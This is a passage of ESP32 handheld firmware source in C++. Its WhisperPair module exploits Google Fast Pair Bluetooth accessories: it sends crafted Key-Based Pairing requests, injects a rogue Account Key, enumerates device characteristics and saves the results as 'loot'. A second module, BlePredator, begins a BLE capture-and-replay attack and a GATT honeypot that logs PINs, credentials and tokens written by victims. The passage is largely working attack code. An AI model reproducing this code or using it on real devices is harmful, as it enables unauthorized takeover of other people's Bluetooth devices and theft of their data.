        f.println("  Status: INJECTED");
    } else {
        f.println("  Status: Not written");
    }
    f.println();

    f.println("-- Phase 3: Intel --");
    f.printf("  Passkey char: %s\n", wpAtkResult.hasPasskey ? "Found" : "Absent");
    f.printf("  AdditionalData: %s\n", wpAtkResult.hasAdditional ? "Found" : "Absent");
    if (wpAtkResult.hasModelId) {
        f.printf("  Model ID: 0x%02X%02X%02X\n",
                 wpAtkResult.modelIdBytes[0], wpAtkResult.modelIdBytes[1],
                 wpAtkResult.modelIdBytes[2]);
    }
    if (wpAtkResult.hasFirmware) {
        f.printf("  Firmware: %s\n", wpAtkResult.firmware);
    }
    f.println();
    f.println("========================================");

    f.close();
    SD.end();

    // Show save confirmation on screen
    tft.fillRect(5, SCREEN_HEIGHT - 55, SCREEN_WIDTH - 10, 14, HALEHOUND_BLACK);
    tft.setTextColor(0x07E0);
    tft.setCursor(10, SCREEN_HEIGHT - 52);
    tft.print("Saved: ");
    char shortName[28];
    snprintf(shortName, sizeof(shortName), "/wp_loot/%.18s", safeMac);
    tft.print(shortName);
}

// ─── Main Attack Orchestrator ───────────────────────────────────────────
static void wpRunAttack() {
    if (wpProbeIdx < 0 || wpProbeIdx >= wpCount) return;
    FPDevice& d = wpDevs[wpProbeIdx];

    inAttack = true;
    inResult = false;
    wpAtkLogCount = 0;
    memset(&wpAtkResult, 0, sizeof(wpAtkResult));
    wpAtkResult.strategyUsed = -1;

    // Draw attack UI
    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);
    tft.fillRect(0, 78, SCREEN_WIDTH, 16, HALEHOUND_DARK);
    tft.setTextColor(0xF800);
    tft.setCursor(5, 82);
    tft.print("ATTACKING: ");
    tft.setTextColor(HALEHOUND_HOTPINK);
    String atkName = String(d.name).substring(0, 16);
    tft.print(atkName);
    tft.drawLine(0, 94, SCREEN_WIDTH, 94, 0xF800);

    if (pWpScan) pWpScan->stop();

    // Reuse the live GATT connection from probe if still up
    if (pWpClient && pWpClient->isConnected()) {
        wpAtkAddLog("Reusing probe link!", HALEHOUND_MAGENTA);
        wpDrawAtkLog();
    } else {
        // Connection dropped — full BLE reinit and reconnect
        wpAtkAddLog("Reconnecting...", HALEHOUND_HOTPINK);
        wpDrawAtkLog();

        if (pWpClient) { pWpClient = nullptr; }
        if (pWpScan) { pWpScan = nullptr; }
        BLEDevice::deinit(false);
        delay(300);

        releaseClassicBtMemory();
        BLEDevice::init("");
        delay(150);

        pWpScan = BLEDevice::getScan();
        if (pWpScan) {
            pWpScan->setActiveScan(true);
            pWpScan->setInterval(100);
            pWpScan->setWindow(99);
        }

        pWpClient = BLEDevice::createClient();
        if (!pWpClient) {
            wpAtkAddLog("Client create FAILED", 0xF800);
            wpDrawAtkLog();
            delay(2000);
            inAttack = false;
            inResult = true;
            wpDrawResult();
            return;
        }

        BLEAddress addr(d.addrStr);
        bool connected = false;
        for (int attempt = 1; attempt <= 3 && !connected; attempt++) {
            if (attempt > 1) {
                char retryBuf[28];
                snprintf(retryBuf, sizeof(retryBuf), "Retry %d/3...", attempt);
                wpAtkAddLog(retryBuf, HALEHOUND_HOTPINK);
                wpDrawAtkLog();
                delay(500);
            }
            connected = pWpClient->connect(addr, d.addrType);
        }
        if (!connected) {
            wpAtkAddLog("Connection FAILED x3", 0xF800);
            wpDrawAtkLog();
            delay(2000);
            inAttack = false;
            inResult = true;
            wpDrawResult();
            return;
        }

        wpAtkAddLog("Connected!", HALEHOUND_MAGENTA);
        wpDrawAtkLog();
    }

    // Find FP service
    wpAtkAddLog("Finding FP service...", HALEHOUND_HOTPINK);
    wpDrawAtkLog();

    BLERemoteService* pSvc = pWpClient->getService(wpFpUUID128);
    if (!pSvc) pSvc = pWpClient->getService(wpFpUUID16);

    if (!pSvc) {
        wpAtkAddLog("FP service NOT FOUND", 0xF800);
        wpDrawAtkLog();
        pWpClient->disconnect();
        delay(2000);
        inAttack = false;
        inResult = true;
        wpDrawResult();
        return;
    }

    wpAtkAddLog("FP service found!", HALEHOUND_MAGENTA);
    wpDrawAtkLog();

    // Find KBP characteristic
    BLERemoteCharacteristic* pKbp = pSvc->getCharacteristic(wpKbpUUID);
    if (!pKbp) {
        wpAtkAddLog("KBP char NOT FOUND", 0xF800);
        wpDrawAtkLog();
        pWpClient->disconnect();
        delay(2000);
        inAttack = false;
        inResult = true;
        wpDrawResult();
        return;
    }

    if (pKbp->canNotify()) {
        pKbp->registerForNotify(wpNotifyCb);
        delay(100);
    }

    wpAtkAddLog("KBP char ready", HALEHOUND_MAGENTA);
    wpDrawAtkLog();

    // Attack-phase UUIDs (stack locals to save DRAM)
    BLEUUID uuidPasskey("fe2c1235-8366-4814-8eb0-01de32100bea");
    BLEUUID uuidAcctKey("fe2c1236-8366-4814-8eb0-01de32100bea");
    BLEUUID uuidAdditional("fe2c1237-8366-4814-8eb0-01de32100bea");
    BLEUUID uuidModelId("fe2c1233-8366-4814-8eb0-01de32100bea");
    BLEUUID uuidDevInfo((uint16_t)0x180A);
    BLEUUID uuidFwRev((uint16_t)0x2A26);

    // ─── Phase 1: Multi-Strategy KBP Exploit ─────────────────────
    wpAtkAddLog("--- PHASE 1: KBP EXPLOIT ---", 0xF800);
    wpDrawAtkLog();

    uint8_t addrBytes[6];
    sscanf(d.addrStr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &addrBytes[0], &addrBytes[1], &addrBytes[2],
           &addrBytes[3], &addrBytes[4], &addrBytes[5]);

    for (int s = 0; s < 4; s++) {
        char logBuf[WP_ATK_LOG_WIDTH];
        snprintf(logBuf, sizeof(logBuf), "Strategy %d: %s", s + 1, wpStrategies[s].name);
        wpAtkAddLog(logBuf, HALEHOUND_HOTPINK);
        wpDrawAtkLog();

        uint8_t kbpReq[16];
        memset(kbpReq, 0, 16);
        kbpReq[0] = 0x00;  // KBP Request message type
        kbpReq[1] = wpStrategies[s].flags;
        memcpy(&kbpReq[4], addrBytes, 6);
        for (int i = 10; i < 16; i++) kbpReq[i] = (uint8_t)random(256);

        wpNotifRx = false;
        wpNotifLen = 0;

        if (pKbp->canWrite()) {
            pKbp->writeValue(kbpReq, 16, true);
        } else {
            pKbp->writeValue(kbpReq, 16, false);
        }

        unsigned long t0 = millis();
        while (millis() - t0 < 2000 && !wpNotifRx) {
            delay(50);
        }

        if (wpNotifRx) {
            wpAtkResult.strategyResults[s] = 2;
            snprintf(logBuf, sizeof(logBuf), "  RESPONSE! %d bytes", (int)wpNotifLen);
            wpAtkAddLog(logBuf, 0x07E0);
            wpDrawAtkLog();

            if (wpAtkResult.strategyUsed < 0) {
                wpAtkResult.strategyUsed = s;
                memcpy(wpAtkResult.kbpResp, wpNotifData, wpNotifLen);
                wpAtkResult.kbpRespLen = wpNotifLen;

                if (wpNotifLen >= 7) {
                    memcpy(wpAtkResult.brEdrAddr, &wpNotifData[1], 6);
                    wpAtkResult.hasBrEdr = true;
                    char brStr[32];
                    snprintf(brStr, sizeof(brStr), "BR/EDR: %02X:%02X:%02X:%02X:%02X:%02X",
                             wpAtkResult.brEdrAddr[0], wpAtkResult.brEdrAddr[1],
                             wpAtkResult.brEdrAddr[2], wpAtkResult.brEdrAddr[3],
                             wpAtkResult.brEdrAddr[4], wpAtkResult.brEdrAddr[5]);
                    wpAtkAddLog(brStr, 0xF800);
                    wpDrawAtkLog();
                }
            }
        } else {
            wpAtkResult.strategyResults[s] = 1;
            wpAtkAddLog("  No response", HALEHOUND_GUNMETAL);
            wpDrawAtkLog();
        }

        delay(300);
    }

    wpAtkResult.phase1Done = true;

    // ─── Phase 2: Account Key Injection ──────────────────────────
    wpAtkAddLog("--- PHASE 2: ACCT KEY ---", 0xF800);
    wpDrawAtkLog();

    BLERemoteCharacteristic* pAcctKey = pSvc->getCharacteristic(uuidAcctKey);
    if (pAcctKey) {
        for (int i = 0; i < 16; i++) {
            wpAtkResult.acctKey[i] = (uint8_t)random(256);
        }

        wpAtkAddLog("Writing Account Key...", HALEHOUND_HOTPINK);
        wpDrawAtkLog();

        if (pAcctKey->canWrite()) {
            pAcctKey->writeValue(wpAtkResult.acctKey, 16, true);
        } else {
            pAcctKey->writeValue(wpAtkResult.acctKey, 16, false);
        }

        wpAtkResult.acctKeyWritten = true;
        wpAtkAddLog("Account Key INJECTED!", 0x07E0);
        wpDrawAtkLog();
    } else {
        wpAtkAddLog("AcctKey char not found", HALEHOUND_GUNMETAL);
        wpDrawAtkLog();
    }

    wpAtkResult.phase2Done = true;

    // ─── Phase 3: Characteristic Enumeration ─────────────────────
    wpAtkAddLog("--- PHASE 3: INTEL ---", 0xF800);
    wpDrawAtkLog();

    // Passkey char
    BLERemoteCharacteristic* pPk = pSvc->getCharacteristic(uuidPasskey);
    wpAtkResult.hasPasskey = (pPk != nullptr);
    wpAtkAddLog(pPk ? "Passkey char: FOUND" : "Passkey char: absent",
                pPk ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL);
    wpDrawAtkLog();

    // Additional Data char
    BLERemoteCharacteristic* pAd = pSvc->getCharacteristic(uuidAdditional);
    wpAtkResult.hasAdditional = (pAd != nullptr);
    wpAtkAddLog(pAd ? "AdditionalData: FOUND" : "AdditionalData: absent",
                pAd ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL);
    wpDrawAtkLog();

    // Model ID char
    BLERemoteCharacteristic* pMid = pSvc->getCharacteristic(uuidModelId);
    if (pMid && pMid->canRead()) {
        std::string mv = pMid->readValue();
        if (mv.length() >= 3) {
            memcpy(wpAtkResult.modelIdBytes, mv.data(), 3);
            wpAtkResult.hasModelId = true;
            char midStr[32];
            snprintf(midStr, sizeof(midStr), "Model ID: 0x%02X%02X%02X",
                     wpAtkResult.modelIdBytes[0], wpAtkResult.modelIdBytes[1],
                     wpAtkResult.modelIdBytes[2]);
            wpAtkAddLog(midStr, HALEHOUND_MAGENTA);
        } else {
            wpAtkAddLog("Model ID: short read", HALEHOUND_GUNMETAL);
        }
    } else {
        wpAtkAddLog("Model ID: not readable", HALEHOUND_GUNMETAL);
    }
    wpDrawAtkLog();

    // Firmware Revision (Device Info Service 0x180A, char 0x2A26)
    BLERemoteService* pDis = pWpClient->getService(uuidDevInfo);
    if (pDis) {
        BLERemoteCharacteristic* pFw = pDis->getCharacteristic(uuidFwRev);
        if (pFw && pFw->canRead()) {
            std::string fv = pFw->readValue();
            if (fv.length() > 0) {
                size_t copyLen = fv.length();
                if (copyLen > 19) copyLen = 19;
                memcpy(wpAtkResult.firmware, fv.data(), copyLen);
                wpAtkResult.firmware[copyLen] = '\0';
                wpAtkResult.hasFirmware = true;
                char fwStr[42];
                snprintf(fwStr, sizeof(fwStr), "FW: %.19s", wpAtkResult.firmware);
                wpAtkAddLog(fwStr, HALEHOUND_MAGENTA);
            }
        } else {
            wpAtkAddLog("FW Rev: not readable", HALEHOUND_GUNMETAL);
        }
    } else {
        wpAtkAddLog("DevInfo svc: absent", HALEHOUND_GUNMETAL);
    }
    wpDrawAtkLog();

    wpAtkResult.phase3Done = true;

    // Disconnect
    pWpClient->disconnect();

    wpAtkAddLog("=== ATTACK COMPLETE ===", 0xF800);
    wpDrawAtkLog();
    delay(1500);

    inAttack = false;
    inAttackResult = true;
    inResult = true;       // MUST be true so loop() reaches the inAttackResult branch
    atkResultPage = 0;
    wpDrawAttackReport();
}

// ─── Public Interface ────────────────────────────────────────────────────
void setup() {
    if (wpInit) return;

    #if CYD_DEBUG
    Serial.println("[WP] WhisperPair Scanner initializing...");
    #endif

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    wpDrawHeader();

    // Tear down WiFi before BLE init — frees radio + heap if WiFi was active
    WiFi.mode(WIFI_OFF);
    delay(50);

    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);

    pWpScan = BLEDevice::getScan();
    if (!pWpScan) {
        Serial.println("[WP] getScan() returned NULL");
        wpExit = true;
        return;
    }

    pWpScan->setActiveScan(true);
    pWpScan->setInterval(100);
    pWpScan->setWindow(99);

    wpCount = 0;
    wpCurIdx = 0;
    wpListStart = 0;
    wpProbeIdx = -1;
    wpExit = false;
    inResult = false;
    pWpClient = nullptr;
    wpInit = true;

    wpDoScan();

    // Consume any lingering touch from menu selection — prevents
    // isBackButtonTapped() in .ino from immediately exiting
    waitForTouchRelease();

    #if CYD_DEBUG
    Serial.printf("[WP] Init complete — %d FP devices found\n", wpCount);
    #endif
}

void loop() {
    if (!wpInit) return;

    // Delegate to loot viewer when active
    if (inLootViewer) {
        WPLootViewer::loop();
        if (WPLootViewer::isExitRequested()) {
            WPLootViewer::cleanup();
            inLootViewer = false;
            waitForTouchRelease();   // Prevent back-tap from bleeding into WhisperPair
            tft.fillScreen(HALEHOUND_BLACK);
            drawStatusBar();
            wpDrawHeader();
            if (inAttackResult) {
                wpDrawAttackReport();
            } else {
                wpDrawList();
            }
        }
        return;
    }

    touchButtonsUpdate();

    // Icon bar touch handling
    static unsigned long lastTap = 0;
    if (millis() - lastTap > 200) {
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            if (ty >= 20 && ty <= 36) {
                if (tx >= 10 && tx < 26) {
                    // Back icon — waitForTouchRelease prevents double-fire
                    waitForTouchRelease();
                    if (inAttackResult) {
                        inAttackResult = false;
                        inResult = true;
                        tft.fillScreen(HALEHOUND_BLACK);
                        drawStatusBar();
                        wpDrawHeader();
                        wpDrawResult();
                    } else if (inResult) {
                        inResult = false;
                        tft.fillScreen(HALEHOUND_BLACK);
                        drawStatusBar();
                        wpDrawHeader();
                        wpDrawList();
                    } else {
                        wpExit = true;
                    }
                    lastTap = millis();
                    return;
                }
                else if (tx >= 96 && tx < 144) {
                    // Loot viewer icon — accessible from device list and attack result
                    if (!inAttack && (!inResult || inAttackResult)) {
                        WPLootViewer::setDirectory("/wp_loot");
                        inLootViewer = true;
                        WPLootViewer::setup();
                        lastTap = millis();
                        return;
                    }
                }
                else if (tx >= 210 && tx < 226) {
                    // Rescan icon
                    if (!inResult && !inAttackResult) {
                        wpDoScan();
                    }
                    lastTap = millis();
                    return;
                }
            }
        }
    }

    // Button handling
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (inAttackResult) {
            inAttackResult = false;
            inResult = true;
            tft.fillScreen(HALEHOUND_BLACK);
            drawStatusBar();
            wpDrawHeader();
            wpDrawResult();
        } else if (inResult) {
            inResult = false;
            tft.fillScreen(HALEHOUND_BLACK);
            drawStatusBar();
            wpDrawHeader();
            wpDrawList();
        } else {
            wpExit = true;
        }
        return;
    }

    if (!inResult) {
        // Device list navigation
        if (buttonPressed(BTN_UP)) {
            if (wpCurIdx > 0) {
                wpCurIdx--;
                if (wpCurIdx < wpListStart) wpListStart--;
                wpDrawList();
            }
        }

        if (buttonPressed(BTN_DOWN)) {
            if (wpCurIdx < wpCount - 1) {
                wpCurIdx++;
                if (wpCurIdx >= wpListStart + WP_MAX_VISIBLE) wpListStart++;
                wpDrawList();
            }
        }

        if (buttonPressed(BTN_SELECT) || buttonPressed(BTN_RIGHT)) {
            if (wpCount > 0) {
                wpProbeDevice(wpCurIdx);
            } else {
                wpDoScan();
            }
        }

        if (buttonPressed(BTN_LEFT)) {
            wpDoScan();
        }

        // Touch to select device — list items draw at y=98 with WP_LINE_HEIGHT spacing
        int visCount = wpCount - wpListStart;
        if (visCount > WP_MAX_VISIBLE) visCount = WP_MAX_VISIBLE;
        int touched = getTouchedMenuItem(98, WP_LINE_HEIGHT, visCount);
        if (touched >= 0) {
            wpCurIdx = wpListStart + touched;
            wpDrawList();          // highlight before probe
            wpProbeDevice(wpCurIdx);
        }

        // Touch bottom bar area to rescan (no BTN_LEFT touch zone on CYD)
        {
            uint16_t bx, by;
            if (getTouchPoint(&bx, &by) && by >= SCREEN_HEIGHT - 18) {
                wpDoScan();
            }
        }
    } else if (inAttackResult) {
        // SAVE — BTN_DOWN zone (x=0-80,y=260-320) covers the save button perfectly
        if (buttonPressed(BTN_DOWN) || buttonPressed(BTN_SELECT)) {
            wpSaveLoot();
            waitForTouchRelease();
        }

        // Page nav — hardware buttons (DIV)
        if (buttonPressed(BTN_RIGHT)) {
            if (atkResultPage < 1) { atkResultPage++; wpDrawAttackReport(); }
        }
        if (buttonPressed(BTN_LEFT)) {
            if (atkResultPage > 0) { atkResultPage--; wpDrawAttackReport(); }
        }

        // Page nav — touch zone for bottom-right arrow area (CYD)
        {
            uint16_t px, py;
            if (getTouchPoint(&px, &py)) {
                if (px >= 160 && py >= SCREEN_HEIGHT - 38) {
                    atkResultPage = (atkResultPage == 0) ? 1 : 0;
                    waitForTouchRelease();
                    wpDrawAttackReport();
                }
            }
        }
    } else {
        // Result view — LEFT returns to list
        if (buttonPressed(BTN_LEFT)) {
            inResult = false;
            tft.fillScreen(HALEHOUND_BLACK);
            drawStatusBar();
            wpDrawHeader();
            wpDrawList();
        }

        // ATTACK button for vulnerable devices
        if (wpProbeIdx >= 0 && wpProbeIdx < wpCount) {
            FPDevice& rd = wpDevs[wpProbeIdx];
            if (rd.result == WPR_EXPOSED || rd.result == WPR_VULNERABLE) {
                if (buttonPressed(BTN_SELECT) || buttonPressed(BTN_RIGHT)) {
                    wpRunAttack();
                    return;
                }
                uint16_t atx, aty;
                if (getTouchPoint(&atx, &aty)) {
                    if (atx >= 140 && atx <= 232 && aty >= SCREEN_HEIGHT - 35 && aty <= SCREEN_HEIGHT - 7) {
                        waitForTouchRelease();
                        wpRunAttack();
                        return;
                    }
                }
            }
        }
    }
}

bool isExitRequested() { return wpExit; }

void cleanup() {
    if (inLootViewer) {
        WPLootViewer::cleanup();
        inLootViewer = false;
    }
    if (pWpClient) {
        pWpClient->disconnect();
        pWpClient = nullptr;  // deinit cleans up tracked clients
    }
    if (pWpScan) pWpScan->stop();
    BLEDevice::deinit(false);
    wpInit = false;
    wpExit = false;
    inResult = false;
    inAttack = false;
    inAttackResult = false;
    inLootViewer = false;
    wpAtkLogCount = 0;
    wpCount = 0;
    wpProbeIdx = -1;

    #if CYD_DEBUG
    Serial.println("[WP] Cleanup complete");
    #endif
}

}  // namespace WhisperPair


// ═══════════════════════════════════════════════════════════════════════════
// BLE DUCKY - BLE HID Keyboard Injection
// ESP32 acts as Bluetooth Low Energy HID keyboard
// When a target device pairs, injects pre-programmed keystroke payloads
// Library: T-vK/ESP32-BLE-Keyboard v0.3.2
// ═══════════════════════════════════════════════════════════════════════════

// BLE Ducky removed — T-vK/ESP32-BLE-Keyboard library is abandoned (240+ open
// issues, broken Windows reconnect, requires target to manually pair).  BLE HID
// keystroke injection is fundamentally inferior to USB HID (Rubber Ducky, Bash
// Bunny) because it cannot operate without user-initiated pairing on the target.


// ═══════════════════════════════════════════════════════════════════════════
// BLE PREDATOR - Unified Listen / Find / Attack Module
// Phase 1: LISTEN  — Passive BLE scan with device classification
// Phase 2: TARGET  — Detail overlay with full ADV payload hex dump
// Phase 3: ATTACK  — Exact MAC + payload replay via raw ESP-IDF
//
// First ESP32 handheld to do standalone BLE capture-and-replay.
// Replaces BLE Scanner + BLE Sniffer with a full attack pipeline.
// Created: 2026-03-23
// ═══════════════════════════════════════════════════════════════════════════

// Forward declaration — defined in HaleHound-CYD.ino (global scope)
extern bool isOffensiveAllowed();

namespace BlePredator {

// ── Constants ─────────────────────────────────────────────────────────────

#define BP_MAX_DEVICES     62
#define BP_MAX_VISIBLE     ((SCALE_Y(180)) / SCALE_H(20))
#define BP_ITEM_HEIGHT     SCALE_H(20)
#define BP_SKULL_Y         (SCREEN_HEIGHT - 48)
#define BP_SKULL_NUM       8
#define BP_BAR_Y           (SCREEN_HEIGHT - 30)

// ── Phases ────────────────────────────────────────────────────────────────

enum PredPhase : uint8_t {
    PHASE_LISTEN = 0,
    PHASE_TARGET,
    PHASE_ATTACK,
    PHASE_RECON,
    PHASE_HONEYPOT
};

// ── Filter modes ──────────────────────────────────────────────────────────

enum PredFilter : uint8_t {
    PF_ALL = 0,
    PF_NAMED,
    PF_STRONG,
    PF_HIGH,
    PF_COUNT
};
static const char* pfNames[] = {"ALL", "NAMED", "STRONG", "HIGH"};

// ── Replay mode ───────────────────────────────────────────────────────────

enum ReplayMode : uint8_t {
    RM_SINGLE = 0,
    RM_ROTATE
};

// ── Dwell presets ─────────────────────────────────────────────────────────

static const uint16_t dwellPresets[] = {100, 500, 2000};
#define BP_DWELL_COUNT 3

// ── GATT Honeypot constants ─────────────────────────────────────────────

#define HP_MAX_SERVICES     8
#define HP_MAX_CHARS        32    // Total across all services
#define HP_MAX_READ_VAL     20    // Max cached read response bytes
#define HP_MAX_LOOT         32    // Circular loot buffer
#define HP_RECON_CONN_TIMEOUT_MS   5000
#define HP_RECON_DISC_TIMEOUT_MS  10000

// Loot event types
#define HP_EVT_CONNECT     0
#define HP_EVT_READ        1
#define HP_EVT_WRITE       2
#define HP_EVT_DISCONNECT  3

// ── GATT Honeypot structs ───────────────────────────────────────────────

struct HpCharInfo {
    uint8_t  uuid128[16];    // Full 128-bit UUID
    uint16_t uuid16;         // 16-bit shorthand (0 if 128-bit only)
    uint8_t  properties;     // ESP_GATT_CHAR_PROP_BIT_READ|WRITE|NOTIFY etc
    uint8_t  cachedVal[HP_MAX_READ_VAL]; // Default read response from real device
    uint8_t  cachedValLen;
    uint16_t handle;         // Assigned by ESP GATTS during creation
    uint8_t  svcIdx;         // Which service this belongs to
};

struct HpServiceInfo {
    uint8_t  uuid128[16];
    uint16_t uuid16;
    uint8_t  charStart;      // Index into hpChars[] array
    uint8_t  charCount;
    uint16_t handle;         // Assigned by ESP GATTS
};

struct HpLootEntry {
    uint32_t timestamp;       // millis()
    uint8_t  victimMAC[6];    // Who connected
    uint16_t charHandle;      // Which characteristic
    uint8_t  type;            // HP_EVT_CONNECT, _READ, _WRITE, _DISCONNECT
    uint8_t  data[20];        // Written data (PINs, creds, tokens)
    uint8_t  dataLen;
};

// ── Device struct (91 bytes) ──────────────────────────────────────────────

struct ReconDevice {
    uint8_t  mac[6];
    uint8_t  addrType;        // BLE_ADDR_TYPE_PUBLIC / RANDOM
    uint8_t  payload[31];     // Full raw ADV payload
    uint8_t  payloadLen;
    int8_t   rssi;
    int8_t   rssiMin;
    int8_t   rssiMax;
    char     name[17];
    char     vendor[8];
    uint16_t companyId;
    uint32_t firstSeen;
    uint32_t lastSeen;
    uint16_t frameCount;
    uint8_t  mfgData[8];
    uint8_t  mfgDataLen;
    bool     hasName;
    bool     randomMAC;
    bool     selected;
    uint8_t  tier;            // DeviceTier: 0=YELLOW, 1=RED, 2=SKIP
};

// ── Heap-allocated state ──────────────────────────────────────────────────

struct PredatorState {
    ReconDevice devices[BP_MAX_DEVICES];
    int          deviceCount;
    int          currentIndex;
    int          listStartIndex;
    uint32_t     totalFrames;

    BLEScan*     pScan;
    bool         scanning;
    uint32_t     scanStartTime;
    PredFilter   filter;

    // Volatile pending queue (callback → main loop)
    volatile bool pendingReady;
    uint8_t      pendingMAC[6];
    uint8_t      pendingAddrType;
    int8_t       pendingRSSI;
    char         pendingName[17];
    bool         pendingHasName;
    uint8_t      pendingMfgData[8];
    uint8_t      pendingMfgLen;
    uint8_t      pendingPayload[31];
    uint8_t      pendingPayloadLen;

    // Replay state
    volatile bool replaying;
    volatile bool replayTaskRunning;
    volatile uint32_t replayCount;
    volatile uint32_t rateWindowCount;
    volatile uint16_t replayRate;
    uint16_t     replayDwellMs;
    uint8_t      dwellIndex;
    ReplayMode   replayMode;
    int          replayRotateIdx;
    TaskHandle_t replayTaskHandle;

    // UI / phase
    PredPhase    phase;
    bool         exitRequested;
    bool         initialized;
    bool         staticDrawn;
    bool         listenDirty;       // True when device list needs redraw
    int          detailIdx;
    int          targetBtnY;        // Y position of buttons in TARGET overlay
    unsigned long lastDisplayUpdate;
    unsigned long lastIconTap;

    // GATT Honeypot — RECON results
    HpServiceInfo hpSvcs[HP_MAX_SERVICES];
    HpCharInfo    hpChars[HP_MAX_CHARS];
    uint8_t       hpSvcCount;
    uint8_t       hpCharCount;
    bool          hpReconDone;

    // GATT Honeypot — runtime state
    HpLootEntry   hpLoot[HP_MAX_LOOT];
    uint8_t       hpLootCount;
    uint8_t       hpLootScroll;     // Display scroll offset
    uint8_t       hpConnCount;      // Total connections received
    bool          hpActive;         // Honeypot running
    uint16_t      hpConnId;         // Current GATT connection ID
    uint16_t      hpGattsIf;        // GATTS interface from REG_EVT
    uint8_t       hpBuildStep;      // Service/char build state machine index
    uint8_t       hpBuildCharIdx;   // Current char being built
    bool          hpAdvStarted;     // Advertising started
    uint8_t       hpVictimMAC[6];   // Current connected victim MAC
    char          hpStatusMsg[32];  // Status message (SAVED, ERROR, etc)
    uint32_t      hpStatusTime;     // When status message was set (0 = none)
    uint16_t      hpStatusColor;    // Color of status message
};

static PredatorState* S = nullptr;
static bool bpWaitForRelease = false;

// ═══════════════════════════════════════════════════════════════════════════
// FORWARD DECLARATIONS
// ═══════════════════════════════════════════════════════════════════════════

static void drawIconBar();
static void drawHeader();
static void drawDeviceList();
static void drawTargetOverlay();
static void drawAttackView();
static void drawSkulls();
static void drawCounterBar();
static void startReplayTask();
static void stopReplayTask();
static void startReplay();
static void stopReplay();
static void startRecon();
static void startHoneypot();
static void buildGenericGATT();
static void stopHoneypot();
static void drawReconView();
static void hpSetStatus(const char* msg, uint16_t color);
static void drawHoneypotStatic();
static void drawHoneypotLoot();
static void handleReconTouch();
static void handleHoneypotTouch();
static void goBackToListen();
static void hpSaveLootToSD();

// ═══════════════════════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════════════════════

static void bpMacToStr(const uint8_t* mac, char* buf, size_t len) {
    snprintf(buf, len, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static const char* bpProximityStr(int rssi) {
    if (rssi > -40) return "< 1m";
    if (rssi > -55) return "1-3m";
    if (rssi > -70) return "3-8m";
    if (rssi > -85) return "8-15m";
    return "> 15m";
}

static void bpDrawRssiBar(int x, int y, int rssi) {
    int bars = 0;
    if (rssi > -40) bars = 5;
    else if (rssi > -55) bars = 4;
    else if (rssi > -65) bars = 3;
    else if (rssi > -75) bars = 2;
    else if (rssi > -90) bars = 1;

    for (int i = 0; i < 5; i++) {
        int barH = 3 + i * 2;
        int barY = y + (12 - barH);
        uint16_t color = (i < bars) ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL;
        tft.fillRect(x + i * 4, barY, 3, barH, color);
    }
}

// Gradient cyan → hot pink (same curve as AirTagReplay)
static uint16_t bpGradientColor(float ratio) {
    if (ratio > 1.0f) ratio = 1.0f;
    if (ratio < 0.0f) ratio = 0.0f;
    uint8_t r = (uint8_t)(ratio * 255);
    uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
    uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
    return tft.color565(r, g, b);
}

static const char* bpAddrTypeStr(uint8_t t) {
    switch (t) {
        case BLE_ADDR_TYPE_PUBLIC:     return "Public";
        case BLE_ADDR_TYPE_RANDOM:     return "Random";
        case BLE_ADDR_TYPE_RPA_PUBLIC: return "RPA(Pub)";
        case BLE_ADDR_TYPE_RPA_RANDOM: return "RPA(Rnd)";
        default:                       return "Unknown";
    }
}

// OUI vendor lookup (same as BleSniffer)
static const char* bpLookupVendor(uint8_t* mac) {
    if (mac[0] & 0x02) return "Random";
    if (mac[0] == 0x00 && mac[1] == 0x1C && mac[2] == 0xB3) return "Apple";
    if (mac[0] == 0xF0 && mac[1] == 0x18 && mac[2] == 0x98) return "Apple";
    if (mac[0] == 0xAC && mac[1] == 0xDE && mac[2] == 0x48) return "Apple";
    if (mac[0] == 0xA4 && mac[1] == 0x83 && mac[2] == 0xE7) return "Apple";
    if (mac[0] == 0x3C && mac[1] == 0x06 && mac[2] == 0x30) return "Apple";
    if (mac[0] == 0x14 && mac[1] == 0x98 && mac[2] == 0x77) return "Apple";
    if (mac[0] == 0xDC && mac[1] == 0xA4 && mac[2] == 0xCA) return "Apple";
    if (mac[0] == 0x78 && mac[1] == 0x7B && mac[2] == 0x8A) return "Apple";
    if (mac[0] == 0x38 && mac[1] == 0xC9 && mac[2] == 0x86) return "Apple";
    if (mac[0] == 0xBC && mac[1] == 0x6C && mac[2] == 0x21) return "Apple";
    if (mac[0] == 0x40 && mac[1] == 0xB3 && mac[2] == 0x95) return "Apple";
    if (mac[0] == 0x6C && mac[1] == 0x94 && mac[2] == 0xF8) return "Apple";
    if (mac[0] == 0x00 && mac[1] == 0x07 && mac[2] == 0xAB) return "Samsng";
    if (mac[0] == 0x00 && mac[1] == 0x16 && mac[2] == 0x6C) return "Samsng";
    if (mac[0] == 0x00 && mac[1] == 0x1A && mac[2] == 0x8A) return "Samsng";
    if (mac[0] == 0x00 && mac[1] == 0x26 && mac[2] == 0x37) return "Samsng";
    if (mac[0] == 0xE8 && mac[1] == 0x50 && mac[2] == 0x8B) return "Samsng";
    if (mac[0] == 0x8C && mac[1] == 0x77 && mac[2] == 0x12) return "Samsng";
    if (mac[0] == 0xCC && mac[1] == 0x07 && mac[2] == 0xAB) return "Samsng";
    if (mac[0] == 0x3C && mac[1] == 0x5A && mac[2] == 0xB4) return "Google";
    if (mac[0] == 0xF4 && mac[1] == 0xF5 && mac[2] == 0xD8) return "Google";
    if (mac[0] == 0x54 && mac[1] == 0x60 && mac[2] == 0x09) return "Google";
    if (mac[0] == 0x00 && mac[1] == 0x1B && mac[2] == 0x21) return "Intel";
    if (mac[0] == 0x00 && mac[1] == 0x1E && mac[2] == 0x64) return "Intel";
    if (mac[0] == 0x68 && mac[1] == 0x05 && mac[2] == 0xCA) return "Intel";
